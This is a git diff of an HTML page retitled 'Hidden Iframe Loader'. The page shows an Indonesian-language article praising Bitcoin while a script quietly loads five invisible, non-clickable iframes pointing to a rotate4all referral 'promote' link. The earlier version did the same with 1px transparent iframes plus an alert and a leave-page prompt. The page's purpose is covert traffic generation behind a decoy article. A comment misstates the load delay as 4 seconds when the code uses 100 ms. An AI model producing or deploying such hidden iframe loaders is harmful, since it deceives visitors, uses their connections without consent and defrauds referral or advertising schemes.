@@ -1,81 +1,104 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
-  <meta charset="UTF-8">
-  <title>Iframe Simple Monitor</title>
-  <style>
+<meta charset="UTF-8">
+<title>Hidden Iframe Loader</title>
+
+<style>
     html, body {
-      margin: 0;
-      height: 100%;
-      font-family: monospace;
+        margin: 0;
+        padding: 0;
+        width: 100%;
+        height: 100%;
+        overflow: hidden;
     }
 
     iframe {
-      width: 1px;
-      height: 1px;
-      opacity: 0;
-      border: none;
+        position: fixed;
+        inset: 0;
+        width: 100%;
+        height: 100%;
+        border: none;
     }
 
-    #log {
-      padding: 20px;
-      background: linear-gradient(135deg,#1e3c72,#2a5298);
-      color: #fff;
-      height: 100%;
+    /* iframe background (tidak terlihat tapi tetap load) */
+    .hidden {
+        opacity: 0;
+        pointer-events: none;
     }
+</style>
 
-    .ok {
-      color: #00ff9d;
-    }
-  </style>
 </head>
 <body>
 
-<div id="log">
-  <h2>🚀 Hello World - Iframe Monitor</h2>
-  <div id="output"></div>
-</div>
+<!-- iframe ke-6 (langsung tampil) -->
+<iframe srcdoc="
+<html>
+<head>
+<style>
+body {
+    font-family: Arial, sans-serif;
+    padding: 20px;
+    line-height: 1.6;
+}
+h1 {
+    color: #f7931a;
+}
+img {
+    max-width: 100%;
+    border-radius: 10px;
+    margin: 20px 0;
+}
+</style>
+</head>
+<body>
+
+<h1>Bitcoin: Mata Uang Digital Masa Depan</h1>
+
+<p>
+Bitcoin adalah mata uang digital pertama di dunia yang diperkenalkan pada tahun 2009 oleh seseorang atau kelompok dengan nama samaran Satoshi Nakamoto.
+</p>
+
+<img src='https://upload.wikimedia.org/wikipedia/commons/4/46/Bitcoin.svg' />
+
+<p>
+Berbeda dengan uang tradisional, Bitcoin tidak dikendalikan oleh pemerintah atau bank pusat. Semua transaksi dicatat dalam teknologi yang disebut blockchain.
+</p>
+
+<p>
+Keunggulan Bitcoin:
+</p>
+<ul>
+<li>Desentralisasi (tidak dikontrol pihak tertentu)</li>
+<li>Transparan</li>
+<li>Keamanan tinggi</li>
+<li>Bisa digunakan secara global</li>
+</ul>
+
+<p>
+Namun, Bitcoin juga memiliki risiko seperti volatilitas harga yang tinggi dan potensi penyalahgunaan.
+</p>
+
+<p>
+Meski begitu, banyak orang percaya bahwa Bitcoin adalah masa depan sistem keuangan digital.
+</p>
+
+</body>
+</html>
+"></iframe>
 
 <script>
-  const URL = "https://www.rotate4all.com/ptp/promote-299681";
-  const output = document.getElementById("output");
+const link = "https://www.rotate4all.com/ptp/promote-296617";
 
-  // 🔥 Alert saat pertama buka
-  window.onload = () => {
-    alert("thanks for coming");
-  };
-
-  // 🔥 Konfirmasi saat mau tutup / refresh
-  window.onbeforeunload = function (e) {
-    e.preventDefault();
-    e.returnValue = "are u sure want to close";
-  };
-
-  function log(msg) {
-    const div = document.createElement("div");
-    div.className = "ok";
-    div.textContent = "[" + new Date().toLocaleTimeString() + "] " + msg;
-    output.appendChild(div);
-  }
-
-  function createIframe(i) {
-    const iframe = document.createElement("iframe");
-    iframe.src = URL;
-
-    iframe.onload = () => {
-      log("Iframe " + i + " loaded ✅");
-    };
-
-    document.body.appendChild(iframe);
-  }
-
-  // 4 iframe dengan delay 0.2 detik
-  for (let i = 1; i <= 4; i++) {
+// load 5 iframe di background dengan jeda 4 detik
+for (let i = 0; i < 5; i++) {
     setTimeout(() => {
-      createIframe(i);
-    }, i * 200);
-  }
-
+        let iframe = document.createElement('iframe');
+        iframe.src = link;
+        iframe.className = 'hidden';
+        document.body.appendChild(iframe);
+    }, i * 100);
+}
 </script>
 
 </body>
